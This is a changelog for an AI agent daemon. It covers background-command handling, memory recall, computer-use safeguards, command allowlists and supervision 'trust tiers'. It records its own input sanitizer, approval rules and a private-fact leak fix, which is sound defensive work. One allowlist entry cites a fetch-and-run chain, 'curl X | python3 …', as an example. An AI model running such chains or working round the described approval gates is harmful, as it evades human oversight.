- **In-loop approach-pivot budget is now durable and per-task.** The stall-driven "try a different approach" retry previously counted pivots in an in-memory counter that reset every turn. The pivot *budget* now lives in the `SelfCorrectionController`'s durable ledger keyed on `task_id`: failed approaches are recorded, the budget is restart-safe (a scheduled task that pivoted, crashed, and resumed no longer gets a fresh budget), and an honest give-up summary is persisted when the budget is exhausted. Any DB error degrades gracefully to the prior in-memory behavior, so the loop is never broken by storage hiccups. No change to which tools require approval.
- **Stuck-task watchdog now reaps on inactivity, not total runtime.** `detect_stuck_tasks` previously marked any running/claimed task older than 5 minutes as `interrupted`, falsely killing legitimately long tasks (observed: a goal had 3 tasks interrupted in a 7-minute window). It now compares each task's latest `task_activity` (tool or LLM call) against a configurable `daemon.watchdog.task_inactivity_timeout_secs` (default 300s), so active tasks survive and only genuinely inactive ones are interrupted. `task_activity.created_at` is normalized to a single UTC format with a new `(task_id, created_at)` index to serve the per-task `MAX(created_at)` lookup.
- **Honest give-up message when self-correction is exhausted.** When the in-loop approach-pivot budget runs out, the daemon now replies with the `SelfCorrectionController`'s summary of what it actually tried ("I tried `du -ah ~`, `find ~ -size +500M`, `du -x -d2 ~` and none worked — want me to try a narrower scope?") instead of the generic "I wasn't able to complete" message. Only the last-resort message changes: tool-output surfacing and the knowledge-only fallback still take precedence when they apply.

### Fixed

- **Duplicate file delivery is suppressed.** When a request ended with an explicit "…then send me the file", the background notifier's deterministic delivery and the model's own `send_file` both delivered the same file, so the user received it twice. The channel hub now de-duplicates identical document deliveries to a session within a short window (keyed on session id + canonical file path) across all delivery paths (`send_media`, `send_media_strict`, the media queue); the redundant send is skipped and reported as success. Genuinely different files (different paths) are never suppressed, photos are never deduped, and a failed send releases the claim so retries aren't blocked.
- **Scheduled-goal execution no longer inherits a stale dialogue scope.** A scheduled-goal firing (`[SYSTEM: already scheduled and firing now; do not reschedule.]`) could carry over a prior turn's `GoalState` semantic scope, which wrongly gated tool exposure during autonomous execution. The scope is now cleared for scheduled-execution text while genuine goal-state questions keep it.
- **Background-completion replies no longer leak the terminal tool's own scaffolding.** When a command ran past 30s and was moved to the background, the completion notifier re-engages the agent loop; the re-engaged model read the "moved to background" tool result from session history and regurgitated its internal status/steering text into the chat — the `Completion notifications are enabled…` sentence and the `Path was auto-injected from … project context` notice (whose `[SYSTEM]` tag the input sanitizer had already rewritten to `[CONTENT FILTERED]`, defeating the existing `[SYSTEM]` block rule). Both phrases are now stripped by `strip_diagnostic_blocks`, and the re-engaged reply is additionally run through `sanitize_user_facing_reply` at the terminal delivery site (defense-in-depth).
- **Deferred deliverables (e.g. "send me the file when done") survive a command being backgrounded.** A long-running command detaching ends the original turn before the follow-up action runs. The background re-engagement follow-up was a generic "continue where you left off," so the model summarized the output instead of completing the remaining step. It now explicitly steers the model to perform any deferred deliverable — for a file, to call `send_file` with the produced path — rather than merely describing the result. (Interim, prompt-level fix; durable per-requirement tracking via the `plans` subsystem is a planned follow-up.)
- **`send_file` no longer loops on files in `/tmp`.** `send_file` only allowed its inbox/outbox dirs, so a file the user asked to be created in `/tmp` was rejected ("outside allowed directories"), and the model burned minutes alternating `send_file`↔`terminal` retries (each a 30–70s local-model call). Now a readable file under a **system temp root** (`/tmp`, `$TMPDIR`, `/var/tmp`, and their `/private` canonicalizations) is auto-copied into the inbox and delivered; anything outside temp returns an actionable error and is never copied. The blocked-pattern security check runs first, so sensitive files are never recovered — recovery is restricted to temp roots specifically so the directory allowlist can't be downgraded into an arbitrary-file-exfiltration path.
- **A tool stuck failing across *different* error messages is now cooled down.** The `/tmp` loop above dodged every stall guard: the per-signature failure limit never tripped (each rejected path was a distinct signature) and `stall_count` kept resetting because the failing `send_file` calls were interleaved with *successful* `terminal` commands. A new aggregate per-tool failure count (summed across signatures) cools the tool down at a threshold of 6, catching loops that vary their error or interleave with other tools' successes.

### Added

- **Checklist telemetry (`GateTelemetry` decision points)** to evaluate and tune the requirement-checklist feature: `checklist_expected` (a plan-worthy turn — capture-rate denominator), `checklist_nudge` (soft-verification fired, with unchecked count), and `checklist_complete` (turn finished, with total/completed/deferred/unchecked counts). All keyed by `task_id` for joins to the turn's `TaskEnd`; gated by `diagnostics.record_decision_points`.

## [0.11.13] - 2026-06-22

### Fixed

- **Background-command answers are no longer blocked from delivery.** When a backgrounded command finished, the re-engagement turn that interprets its output was treated as still *needing a tool* (the original request's intent carried over), so the completion gate blocked the text answer and the no-tool recovery forced `tool_choice=required` — which on some local models (e.g. `gemma-4-26b`) degenerated into a multi-minute token-repetition loop. A one-line answer could take 6 iterations / 5+ minutes to deliver. Fixed at the source: the intent gate now recognizes the `[Background command completed]` delivery turn as already having its observation (`needs_tools=false`), so the answer is delivered immediately. Models that ignore forced `tool_choice=required` are now seeded/persisted so the daemon never re-arms the degeneration after a restart.
- **No more contradictory "stopped, no results" after a finished command.** A disowned background command that completed and delivered its output was not removed from the running-process map, so the idle-reaper would later "reap" the already-finished process and send a contradictory message. The process is now removed on delivery.
- **Hung background terminal commands are now auto-stopped**: a disowned background command that produces no new output for 5 minutes (e.g. a whole-disk `du -ah ~ | sort | head` or unbounded `find ~`, which can run for hours without exiting) is now stopped by a heartbeat-driven idle reaper, and the user is told it was stopped and why. Previously the per-process notifier only delivered on process *exit*, so a command that never exited would pin a notifier task and disk I/O indefinitely (observed: a `du` scan still alive ~11 hours later, with one orphan leaked per attempt). Only `notifier_active && !detached` processes are eligible; any process that keeps streaming output resets its idle clock and is never reaped, and detached processes (e.g. dev servers started with `detach=true`) are exempt.

## [0.11.12] - 2026-06-22

### Fixed

- **Background short-output delivery is now sanitized**: a backgrounded command's tool-less-LLM interpretation was delivered straight to the user without the agent loop's reply sanitizer, so internal scaffolding the model echoed — terminal control hints (`Use action="check" pid=…`) and `[SYSTEM]`/`[CONTENT FILTERED]` directives — could leak into the chat. The short-output path now runs `sanitize_user_facing_reply` before delivery/enqueue. (The re-engaged path was already sanitized; the raw-output fallback stays verbatim.)
- **Deterministic `core_profile` rendering**: the owner-profile block now renders from a `BTreeMap` with a stable sort, so it is byte-identical across renders.

### Changed

- **`core_profile` restored to the cached CORE prompt block** (safe now that its rendering is deterministic), improving prompt-cache hit rate versus the per-task TAIL placement introduced in 0.11.11.

### Added

- **Per-render `core_profile` selection-digest telemetry** to diagnose prompt-cache stability.

## [0.11.11] - 2026-06-21

### Added

- **Per-turn intent-classification telemetry**: every turn records the intent-gate result (needs-tools), the classified complexity, and the chosen orchestration route as a `DecisionType::IntentGate` decision point, so routing decisions are queryable from the event store.
- **Inline-dump observation telemetry (measure-first)**: an `inline_dump` event fires when the model hits the output token limit while answering inline (no tool call), paired with an `inline_dump_spill` marker when a large result was spilled that turn. `scripts/inline-dump-stats.sh` counts these and the "fixable" subset (turns that spilled) — input for deciding whether a hard output-cap is worth building. Observation-only; no behavior change.

### Changed

- **`http_request` response caps raised** to 10 MB default / 50 MB maximum, with large JSON bodies kept **compact** (no pretty-printing) so big API responses stay within token/memory budgets instead of being inflated by whitespace.

### Fixed

- **Background-task scaffolding no longer leaks into replies**: a backgrounded command's reply could echo internal machinery into the user-facing message — the terminal control hint (`Use action="check" pid=… to stop`) and the background-task system directive (which survived once `[SYSTEM]` was rewritten to `[CONTENT FILTERED]`). Both are now stripped by `strip_diagnostic_blocks`.
- **`web_fetch`/`web_search` response bodies are capped** to bound memory on very large pages.

### Performance

- **Prompt-cache stability**: moved `core_profile` from the cacheable CORE block to the per-task TAIL, so owner-profile changes no longer invalidate the session-static core prompt.

## [0.11.10] - 2026-06-20

### Added

- **`write_file` append mode for chunked large-file writes**: `write_file` now accepts an optional `mode: "overwrite" | "append"` (default `"overwrite"`, fully backward compatible). `"append"` adds to the end of a file without a backup and returns a continuation hint, so large *model-authored* content can be built across several bounded calls instead of one oversized generation that hits the output token limit.

### Changed

- **Large output is steered to file delivery instead of inline-dumping**: the result-spill notice now also tells the model to deliver large data via `send_file` (after extracting a clean file with a tool), a new system-prompt rule discourages pasting large lists/datasets into chat, and the token-limit truncation-recovery nudge now branches by data source — existing data → `send_file`; model-authored → `write_file` append chunks. This addresses cases where the model tried to emit a very large list inline (slow, exceeds the output token limit, overflows chat message limits).
- **Shared `core_behavioral_rules()` single source**: the agent-agnostic behavioral rules (anti-fabrication, capability honesty, test honesty, file-tool usage, large-output delivery, data-integrity, credential protection) are factored into one function consumed by the prompt builder. Content-preserving refactor — no rule text changed — that makes future rule changes single-source.

### Fixed

- **Heartbeat stays alive during long LLM calls**: a generation that ran longer than the channel stale-watchdog threshold (300s) could be auto-cancelled mid-flight, because the heartbeat was only touched *after* the LLM call returned. A keeper now touches the heartbeat every 30s during the call (bounded by the existing LLM timeout), so the watchdog cancels genuine hangs but not slow-but-progressing generations.

## [0.11.9] - 2026-06-20

### Fixed

- **Large tool results no longer lose their middle to silent truncation**: an oversized tool result (e.g. a multi-hundred-KB `http_request` response, a long `terminal` dump) was squeezed to the per-model character cap by the generic compressor, which keeps a head + tail and **drops everything in between**. For an enumeration request — "give me the full list of locations" — the dropped middle was exactly the data the user wanted, so the model answered from a partial view and reported things like "the full list is too massive to retrieve in one go." The full data is now preserved and recoverable (see below), so the model can answer completely instead of from a truncated slice.

### Added

- **Spill-to-file recovery for oversized tool results**: when a non-`read_file` tool returns a successful result larger than the per-model cap and a filesystem tool (`read_file` or `terminal`) is available, the **full, untruncated** result is written to `<temp_dir>/aidaemon/tool_results/<session>/` and the model receives a bounded preview (head + a JSON structural summary when the body parses) plus an explicit, anti-fabrication pointer to the file. The model then recovers the rest with `read_file` paging or `grep`/`jq`/`wc` over the saved path, instead of guessing or apologizing. JSON bodies that parse as a whole are pretty-printed and saved as `.json` (with a `jq` hint); wrapped/mixed bodies are saved verbatim as `.txt` and the `jq` hint is withheld so the model is never pointed at a command that cannot run. Pure-no-filesystem deployments fall back to the previous lossy compression. Verified live end-to-end: a 963-location clinical-trials response (~620 KB) spilled to disk with all entries intact and the model returned the complete, correct list.
- **Hourly cleanup of spilled tool-result files**: a background job prunes the spill directory by age (24 h) and total size (256 MB, oldest-first), so scratch files from large fetches don't accumulate across a long-running daemon.

## [0.11.8] - 2026-06-20

### Fixed

- **Observational follow-ups after a mutation are no longer mis-scored or blocked**: a question that simply observes the result of a prior task — e.g. "what's in that file?" after "create that file", or "what does that script do?" after "create the script" — was inheriting the *previous* request's mutation expectation. The completion contract is inferred from the enriched `goal_user_text` (which prepends the prior request), and `sanitize_carryover_blocks` strips the `"Original request:"` label but leaves `"Current request:"`, so the contract logic keyed off the wrong marker and classified the follow-up as the prior mutation. The turn then hit `expects_mutation=true` with no mutation tool called, got blocked for extra iterations, and was scored `failed`/`partial` despite returning a correct answer (polluting learning signals and feeding spurious failure telemetry). `current_request_segment()` now keys off the surviving `"Current request:"` / `"Follow-up:"` marker so the contract reflects what the *current* turn asks. Verified live before/after (two `mutation_contract_block` events + `partial` → zero blocks + `succeeded`).
- **Duplicate slash-command deliveries no longer execute twice**: slash commands (`/clear`, `/cancel`, …) returned before the message dedup gate, so a duplicate Telegram delivery of the same update (same message id) ran the command twice — e.g. two "Context cleared." replies, a double `/cancel`. Commands now pass through the same `msg.id`-keyed dedup as regular messages; intentional repeats (distinct message ids) are unaffected.

## [0.11.7] - 2026-06-19

### Fixed

- **Backgrounded commands with short results no longer drop the answer**: a long-running command that finished with a short output (a `wc -l` count, a path, a one-word status) used to deliver only a bare "✅ Background command finished" ping with no result. The completion path classified any output under 5 characters as "trivial" and skipped delivery entirely — so e.g. "how many resumes?" → the count never reached the user. Now only genuinely empty output is treated as trivial.
- **No more duplicate "background command finished" notices / re-run churn**: short results were re-fed into the full agent loop, where small local models tended to *re-run* the (slow) command, re-detaching to the background and re-engaging repeatedly — emitting a "finished" ping per re-run. Short results are no longer routed back through the loop.

### Added

- **Tool-less interpretation of short background results**: when a backgrounded command finishes with a short, complete result, it is now turned into one plain-language sentence via a single LLM call made with **no tools** — the model can only reply in text, so it physically cannot re-run the command (which was the source of the churn). Falls back to delivering the raw value if the call is unavailable, so the answer is never lost. Example: instead of `Result: 160`, you get "There are 160 PDF files in your projects folder, though this count only includes files that match that specific extension."
- **Searched-but-denied observation telemetry**: a `memory_recall`-target log fires when the model denies a named-person relational query *after* a memory search returned non-empty results — a possible "reasoning miss" where connecting facts were present but unused. Observation-only (no behavior change); it lets us measure whether this failure mode actually occurs before deciding to build a gate for it.

### Changed

- **Friendlier "moved to background" handoff message**: the message shown when a command is moved to the background no longer exposes internals (raw shell commands with flags, failed probe attempts, the process id, and "completion notifications are enabled" jargon — these belong in logs, not chat). It now reads as a short, warm reassurance plus a `Working on: "<your request>"` gist derived from the user's own message.

## [0.11.6] - 2026-06-19

### Added

- **Read-time neighborhood retrieval (relational memory recall)**: when a memory search matches a relationship-typed or namespaced fact, the connected *neighborhood* — the entity's fact cluster plus the facts of co-occurring entities — is assembled into the search results, so the model can *derive* relational answers it cannot look up directly. Fixes cases like "who is Conchi's spouse?" → Galo Loor (derived from separately-stored mother/father facts) and "who is my daughter Bella's mother?" → Aracely Zambrano, which previously deflected or denied. Entity resolution is semantic (read from the embedding-matched results, word-boundary matched — never query token-matching); the path is fully deterministic with no per-search LLM call.
- **Search-before-deny gate**: the completion phase blocks a relational *denial* about a named entity the model never searched for, injecting a directive to look it up first (bounded retry, owner-DM scoped, fail-open, and it never asserts that a partner is a child's biological parent). Precedence across the relational interventions: coreference grounding → neighborhood assembly → denial gate.
- **Neighborhood telemetry**: a `memory_recall`-target log records neighborhood assembly latency (`assembly_ms`), entities resolved, and facts added.

### Changed

- The relational-intent classifier in `agent/intent/llm_classifier.rs` is now wired into production (for the search-before-deny gate); it was previously shadow-only scaffolding.

## [0.11.5] - 2026-06-18

### Added

- **Active episodic recall** (`manage_memories` action `search_episodes`): the agent can now recall past conversations on demand — semantic search with a `query`, or a recent-conversations browse without one. Results carry relative timestamps, topics, and outcomes. Previously episodic memory was only reachable via passive top-3 injection, so the agent couldn't answer "what did we work on earlier / last time we discussed X". Owner-only (tool roster is empty for non-owners), so it inherits the owner's history scope with no new privacy surface.
- **Memory-recall telemetry**: the `MemoryRetrieval` decision-point event now records the top injected fact keys (`top_facts`), and explicit reranked search emits a `memory_recall`-target log with candidate-pool size, rerank latency, whether the reranker reordered the top result, fallback status, and the top results with scores — so recall quality and reranker cost/benefit are observable without ad-hoc measurement.
- **Hybrid fact search**: `manage_memories action='search'` now combines word-boundary keyword matching with a pure-semantic vector pass (`FactStore::search_facts_semantic`, thresholded, no recency padding), merged and deduped by fact id, so conceptually-related facts the keyword pass misses still surface (semantic-only matches are tagged in the output).
- **Cross-encoder reranking on explicit search**: `search_facts_semantic` now does retrieve-then-rerank — the top bi-encoder candidates are re-scored by a lazily-loaded multilingual cross-encoder reranker (JINA reranker v2). A small bi-encoder rates *attribute* facts about an entity ("wife covers insurance") above the *answer-bearing identity* fact ("partner name: Aracely") for queries like "spouse" — measured rank ~31; the cross-encoder reads (query, fact) together and reorders so the answer surfaces. Scoped to explicit, owner-initiated search; falls back to bi-encoder order if the reranker is unavailable (offline/load failure). Multilingual model chosen for the owner's mixed EN/ES memory.

### Changed

- **Long-running goal progress heartbeats**: replaced the hard 4-message cap (which left goals silent after ~2 minutes) with an exponential backoff schedule (15s, 30s, 1m, 2m, 5m, 10m, then every 15m). Long goals keep emitting progress; the growing interval prevents spam, and a still-running planning phase no longer goes silent.
- **Deliverable-first goal summaries**: substantive task results now lead the goal wrap-up, with generated activity recaps ("Commands run: …") ordered after and given a smaller truncation budget, so the user sees what they actually asked for first.
- **Memory search recency**: `search` results now include when each fact was learned (`learned: <age>`, from `first_seen_at`/`created_at`), so temporal questions ("when did I tell you X?") can be answered from the results directly instead of resorting to the wrong tool.
- **Generic tool-call budget**: `manage_goal_tasks` is now exempt from the generic per-turn budget (task-lead bookkeeping legitimately needs list + claim/complete calls per task), alongside the existing local-work and MCP tool exemptions.

### Fixed

- **Memory search missed exact facts**: keyword matching was substring-based, so `"port"` matched `report`/`portfolio`/`important` and buried the canonical fact (`local_dev_db_port`) past the result limit. Switched to word-boundary token matching over structured keys with key-field weighting; the canonical fact now ranks first.
- **Near-synonym recall missed under the threshold**: common synonyms the small embedding model rates just below the `0.30` passive-injection cutoff — e.g. `"spouse"`/`"wife"` (~0.28/0.23) against a stored `partner_name` fact — were missed on the search path. `search_facts_semantic` now uses a recall-oriented `0.22` cutoff (explicit, owner-only search merged after the precise keyword pass), so these resolve reliably; passive context injection keeps the stricter `0.30` to avoid prompt bloat.
- **Recalled facts re-stored as duplicates**: progressive extraction was fed the assistant's reply, so on a recall turn it re-persisted facts the assistant merely recalled — often under a new category — duplicating them and letting "forgotten" facts resurface. Added a recall-restatement guard (suppresses a recalled value already stored under the same canonical key, or a distinctive multi-word value under any key; user-stated values and corrections are never dropped).
- **Executor blockers surfaced late**: when an executor calls `report_blocker`, it is now a terminal outcome — the loop ends with the structured blocker summary and the blocker is pushed to the user immediately, instead of being buried in the goal wrap-up.
- **Spawn-timeout discarded completed work**: when a child executor persisted a terminal outcome (e.g. a reported blocker) just before the parent's spawn timeout cancelled its future, that richer outcome is now salvaged and delivered instead of a generic timeout error.
- **Specialist mis-routing on "report"**: ops tasks phrased as "report success" / "report the error" (verb) are no longer routed to the artifact-writer specialist; "a report" (noun) still is.
- **Memory tool status mislabel**: the *completion* status ping for `manage_memories`/`manage_people` derived its read-vs-write label from the result text (which starts with formatting like `══ Stored facts…`), so every operation — including reads — completed as `updating memory`. It now uses the action (matching the start ping), and `search_episodes` is registered as a read; reads now correctly show `checking memory`.
- **Terminal-bridge log spam**: routine WebSocket reconnects (idle/proxy resets — `ResetWithoutClosingHandshake`, peer reset / broken-pipe / EOF) were logged at `ERROR`, thousands of lines that drowned real errors. They are now classified as transient and logged at `WARN` ("disconnected (transient), reconnecting"); genuine connection failures stay `ERROR`.

### Security

- **Private-fact leak to non-owner DMs**: system-prompt fact injection keyed the DM "full graph" short-circuit on channel visibility rather than sender role, so an allowlisted non-owner ("Guest") DMing the bot could receive the owner's Private and other-channel facts. `FactStore::get_relevant_facts_for_channel` now takes `requester_is_owner`: only the owner gets the unfiltered DM graph; a non-owner DM is filtered exactly like a group channel (Global + same-channel facts only, never Private or other-channel). Not exploitable in single-owner deployments, but latent in any multi-user/allowlisted setup.

## [0.11.4] - 2026-06-12

### Added

- **Opt-in Gemma / llama.cpp thinking** (`[provider] llama_cpp_thinking = true`): OpenAI-compatible providers can enable llama.cpp chat-template thinking for models such as Gemma without changing the default request shape for other backends.
- **Web answer grounding**: enumeration-style replies (long bullet/numbered lists of name-like entities) are checked against tool outputs and the user's message before delivery; multiple ungrounded entries trigger a rewrite directive instead of shipping fabricated rosters. `web_fetch` and `web_search` also retain richer snippet/metadata for corroboration.
- **Browser scroll action**: the `browser` tool supports `scroll` with `direction` (`up`/`down`) and `amount` (pixels), routed as a bounded observation primitive without approval.

### Changed

- **Intent gate cleanup**: removed the dead Layer-2 `[INTENT_GATE]` model self-report protocol (unused since v0.9.21). Enforcement remains a single deterministic keyword gate plus trust-tiered supervision at completion sites; defensive marker stripping is unchanged. `LlmRuntimeSnapshot::fast_model()` removed — background callers now use `primary_model()` (behavior-identical; `Router::select` already ignored the tier).

### Fixed

- **Browser scroll**: previously missing from the browser tool schema and dispatch path.

### Documentation

- **`trust_tier` override**: README now documents setting `[policy] trust_tier = "autonomous"` for capable open models the auto list doesn't recognize, including what stays enforced on every tier.
- **Intent gate architecture**: CLAUDE.md/AGENTS.md updated to describe the actual single-layer design and unwired classifier scaffolding.

## [0.11.3] - 2026-06-11

### Added

- **Model trust tiers** (`[policy] trust_tier = "auto" | "guided" | "autonomous"`): the agent loop now adapts its supervision scaffolding to the model's capability. Frontier models (claude-*, gpt-4/5, o-series, gemini-2.5+, grok-3/4 — or any model with `trust_tier = "autonomous"`) run a thin loop: the intent-narration gate, plain-text drift redirect, uncertainty clarification gate, pre-execution evidence/planning/critique gates, and deferred-action text blocking become telemetry-only instead of bouncing the model, and per-tool budget caps scale 3× to research volume (e.g. web_search 5 → 15 per task). Small/local models keep the full supervision harness unchanged. Hard safety caps (iteration/token/wall-clock limits, repetition guards) and ledger-verified anti-fabrication checks (claimed mutations with zero tool calls, structural protocol markers) stay enforced on every tier.
- **Heuristic fire telemetry**: every supervision gate now records (heuristic, model, tier, enforced/shadow-skipped) to an in-process registry and emits a structured tracing event under the `heuristic_telemetry` target, so gate false-positive rates can be tuned per model from data instead of anecdote.
- **Approach-pivot retries**: a stalled task whose approach is demonstrably failing (unrecovered errors, or zero successful tool calls) no longer ends at the stall. The loop builds a deterministic failure record — tool calls tried, unrecovered error lines verbatim, count of state-changing actions already performed — injects it as a pivot directive ("do NOT retry this approach; choose a fundamentally different method"), resets the stall trackers for fresh runway, and continues. Bounded at 2 pivots per task; hard iteration/token/wall-clock caps still apply; the existing graceful exits run unchanged once pivots are exhausted. The failed attempt stays verbatim in history — the record is a reference, not a replacement.
- **Planner-based completion-contract inference**: the task-start planning call now classifies `task_kind` / `expects_mutation` / `requires_observation` from the actual request (any language) and refines the English-keyword contract inference; explicit user verification requests are never relaxed.
- **Parallel read-only tool batches**: when one assistant message carries 2+ distinct read-only no-approval tool calls, their I/O executes concurrently; the sequential loop keeps full ownership of guards and budgets and falls back to live execution if its computed arguments diverge from the prefetch.
- **Extended thinking (native Anthropic)**: `[provider] reasoning_effort` now maps to extended-thinking `budget_tokens` on the Anthropic provider; thinking blocks are parsed, preserved with signatures, and replayed on tool-use continuation.
- **SSE streaming transport** (`[provider] streaming = true`, OpenAI-compatible): responses stream and are accumulated to the exact buffered shape, so the parse path, token accounting, and tool-call handling are unchanged. A stream that dies or stalls after partial text finalizes as a `length` cutoff, reusing truncation recovery to continue the response instead of losing it.
- **Anthropic prompt-cache breakpoints**: the native Anthropic provider now sets `cache_control: ephemeral` on the last tool definition, the system prompt block, and the final message's tail content block. Combined with the existing byte-stable core-prompt/archived-history architecture, each agent-loop iteration reuses the previous call's cached prefix instead of re-ingesting it at full input price (cache hits were already parsed from `cache_read_input_tokens` but never produced).
- **Plain reminders fast path**: one-shot "remind me to …" requests auto-confirm without the approval gate and deliver at fire time with a direct message — no TaskLead, no LLM round-trip. Heartbeat recognizes reminder-shaped goals and sends `⏰ Reminder: …` immediately (pronouns flipped to second person); recurring reminders stay active with their schedule intact. Recall-style questions ("remind me what I said about …") still go through the normal scheduled-goal pipeline.
- **Humanized schedule times**: run times render as conversational phrases ("today at 1:46 PM (in 1 minute)", "tomorrow at 9:00 AM", "Friday at 9:00 AM") instead of raw timestamps; confirmation copy drops redundant timezone footnotes.
- **Immediate scheduled-task dispatch**: heartbeat claims and dispatches due scheduled tasks on the same tick instead of waiting for the 60s orphan-recovery pass, so recurring checks start on time.
- **computer_use session telemetry**: per-task action log with mutation budget, element targets, click method, and session summary for post-mortems (complements existing per-action tracing events).
- **computer_use status pings**: DM status pings show readable summaries ("click Calculator #12") instead of raw JSON.
- **Parallel multi-backend web search**: `web_search` fans out to every configured backend in parallel (primary first, then Brave when `search.api_key` is set, SearxNG when `search.searxng_url` is set, and DuckDuckGo as a free supplementary source) and merges results with reciprocal-rank fusion. URLs are deduplicated; results appearing in multiple backends rank higher; snippets and publication age are preserved when known. Per-backend 12s timeouts prevent one slow source from stalling the whole search. Disable fan-out with `[search] parallel = false`.
- **SearxNG search backend**: self-hosted SearxNG instances are supported via `[search] backend = "searxng"` and `search.searxng_url` (no API key required).
- **Web search freshness filter**: `web_search` gains an optional `freshness` parameter (`day`/`week`/`month`/`year`) mapped to each backend's native recency parameter for time-sensitive queries.

### Changed

- **Scheduled goal progress copy**: single-step goals get humane "Still working on it…" updates instead of "0/1 steps completed, 1 in progress" jargon; multi-step goals use simpler "X/Y steps done" wording.
- **computer_use mutating-action budget default**: raised from 15 to 40 in `config.toml.example` (dense UIs like Calculator need more clicks).
- **Web search result limits**: default merged results raised to 8 (max 20).

### Fixed

- **"Allow Always" was ineffective for chained and detached commands**: approving `cd X && npm run dev -- --port 3000` with "Always allowed" re-prompted on every argument variant — and even on identical re-runs. Three stacked causes: `detach=true` forced approval unconditionally (allowlists were never consulted), chained commands were persisted as the verbatim full string which `is_allowed`'s chained branch could never match, and exact-match storage meant a changed port was "a new command". Now "Allow Always" on a chained command stores each segment's binary (`cd`, `npm`) as permanent prefixes — the same trust grant as Always-allowing each simple command directly — so re-runs differing only in arguments pass; detached commands respect the allowlist (only novel detached commands prompt, and untrusted-source triggers still always prompt); legacy verbatim full-chain entries persisted by the old behavior still match exact re-runs. Session-approval semantics are unchanged: approving `curl X | python3 …` for the session still never unlocks other chains.

- **Never-exiting background commands dead-ended the conversation**: a tracked background command that never exits on its own (e.g. `npm run dev`) promised a completion notification that could never fire — periodic progress pings stopped after 3 ticks (and were suppressed without new output), the notifier then waited forever on process exit, and the agent never reported back. The user was left in silence, and every retry leaked another dev server squatting the next port. Once periodic pings are exhausted, the notifier now re-engages the agent once with the output so far (a synthetic `[Background command still running]` follow-up, exempted from schedule-extraction heuristics and always classified as a follow-up) so it tells the user the current status — e.g. the URL/port a dev server is listening on — and completes the original task. A friendly fallback notice is queued when the agent path is unavailable or over the re-engagement budget. The process keeps running, and the final completion notification still fires if it ever exits.
- **Models ignoring forced `tool_choice=required`**: serving stacks that return text with zero tool calls despite `tool_choice=required` (observed: llama.cpp + Gemma → repetition loop until token limit) are flagged in-memory after one strike; deferred/no-tool recovery stops re-forcing `required` and converges via substantive-text acceptance instead.
- **search_files path copy-paste failures**: trailing punctuation from prose (`/projects)`, `/path:`) is stripped when the literal path doesn't exist; output format no longer glues the scanned directory to a closing parenthesis, preventing invalid paths on the model's next call.
- **db_probe event time windows**: harness-eval, telemetry reconciliation, and task-outcome queries use RFC3339 cutoffs instead of SQLite `datetime()` space-format strings, which silently degraded same-day filters to calendar-day granularity. Token-only reconciliation rows now split by session and whether the `llm_call` event is missing vs. present with `token_usage_present=false`.
- **DuckDuckGo redirect unwrapping**: DDG lite tracking redirects are decoded to real destination URLs so `web_fetch` and the model get usable links instead of protocol-relative `/l/?uddg=…` wrappers.
- **DuckDuckGo bot-challenge detection**: empty or blocked DDG responses (anomaly modal / bot wall) fail clearly instead of returning misleading "no results".
- **computer_use consequential approvals**: "Allow Always" / "Allow Session" on a consequential action now proceeds as a one-time allow instead of erroring — persistent grants are still never stored for consequential GUI actions.
- **computer_use `activate_app` without snapshot**: `snapshot_generation` is optional for `activate_app` (often the first action on an app, before any `get_app_state`); mutating actions still require it with instructional errors when missing.

## [0.11.2] - 2026-06-10

### Added

- **Command context in DM status pings**: terminal status pings in private 1-on-1 DMs now show the command being run (`` Running a command: `cargo build --release` ``) instead of a bare "Running a command...". The command is hardened before display: home directory shortened to `~`, secrets redacted *before* truncation (a boundary-cut key can never leak a prefix), whitespace collapsed, capped to fit the 80-char status budget. Group, public, external, and internal channels — and any future visibility variant — fail closed to the bare label. DM ToolComplete pings likewise show the redacted first line of command output.
- **Prompt snapshots**: rendered system prompts are persisted once per content hash (`prompt_snapshots` table, `PromptSnapshotStore` trait), letting any past `llm_call` be replayed exactly from its `instructions_snapshot` event. `db_probe` can inspect stored snapshots.
- **Native computer use (macOS)**: new feature-gated `computer_use` tool lets the agent operate native macOS apps — it reads an app's accessibility tree, captures a window screenshot, and clicks/types/scrolls in a loop until the task completes. Perception feeds the existing tool-origin vision pipeline (only the latest screenshot is retained per turn). Build with `--features computer_use-macos` and enable `[computer_use] enabled = true`. Layered safety: per-session approval, per-app inspect/control scopes, one-use point-of-action confirmation for consequential actions, generation-bound element indices, and hard blocks (secure fields, login windows, Terminal, aidaemon itself). A vision+tools-capable model is pinned for the duration of a GUI task; the loop aborts at start if none qualifies. Standalone `computer_use_probe` binary for manual harness testing. Full setup: `COMPUTER_USE_MACOS.md`.
- **macOS signed app-bundle packaging**: `aidaemon install-service` now packages the daemon as a signed `~/Applications/aidaemon.app` (stable bundle id `ai.aidaemon`) and points launchd at the binary inside it, giving `computer_use` Accessibility / Screen Recording grants a stable code identity (the bundle's designated requirement) instead of an ad-hoc signature that changes every build. New `scripts/create-signing-identity.sh` (one-time self-signed identity) and `scripts/package-macos-app.sh` (build + bundle + sign + reload) support the dev loop. The daemon now prevents idle sleep itself (`caffeinate -i -w <pid>`) rather than via a launchd `caffeinate` wrapper, keeping a clean TCC code identity. Note: with a *self-signed* identity on recent macOS the grant is not fully rebuild-proof — it may need re-granting after a rebuild and can degrade at runtime to "trusted-but-no-access"; a real Apple Developer ID + notarization is the durable fix (see `COMPUTER_USE_MACOS.md`).

### Changed

- **Per-model tool-result caps**: large tool results are compressed against a per-model character budget (`tool_result_chars_for`) instead of one global cap, so small-context local models get tighter results while big-context models keep more. `read_file` results page on line boundaries with an explicit continuation hint instead of destructive mid-drop compression, and semantic read replays respect the same cap.
- **search_files hardening**: bounded BFS traversal budget and richer match context for small-model file discovery.
- **Status ping copy**: dropped the "Using " prefix and capitalized the activity label ("Running a command..." instead of "Using running a command...").
- **Core profile prompt**: definite references ("the owner", "it", "they") resolve against the recent conversation first, falling back to stored owner facts only when no antecedent exists.

### Fixed

- **Fact source provenance backfill**: a startup migration normalizes unknown `facts.source` values to `inferred` against an explicit allowlist of live writer-stamped sources, so legacy rows can't masquerade as user-stated provenance.
- **Gutted-reply fallback**: replies that sanitization reduced to a dangling lead-in stub ("Here are the results:") are detected and replaced with an activity summary instead of being sent as a non-answer.
- **computer_use AppleScript injection**: app activation now targets the process by PID instead of interpolating the app name into an AppleScript string.
- **computer_use app enumeration race**: `list_apps` no longer aborts with a transient "Invalid index" when the process table changes mid-scan (defensive per-process reads + retry).
- **computer_use multi-step flows**: the plain-text completion guardrail no longer redirects an in-progress GUI flow back to text, so the agent can carry a desktop task through multiple clicks.
